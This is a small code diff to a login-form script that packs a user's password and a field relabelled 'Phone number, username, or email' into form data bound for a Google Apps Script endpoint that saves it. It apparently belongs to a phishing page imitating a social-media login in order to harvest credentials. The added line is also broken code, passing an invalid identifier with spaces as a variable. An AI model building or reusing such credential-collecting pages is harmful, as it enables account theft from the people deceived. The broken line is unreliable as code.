@@ -12,7 +12,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         // Prepare data to send
         const formData = new FormData();
-        formData.append("email", email);
+        formData.append("Phone number, username, or email", Phone number, username, or email);
         formData.append("password", password);
 
         // Google Apps Script endpoint to save data
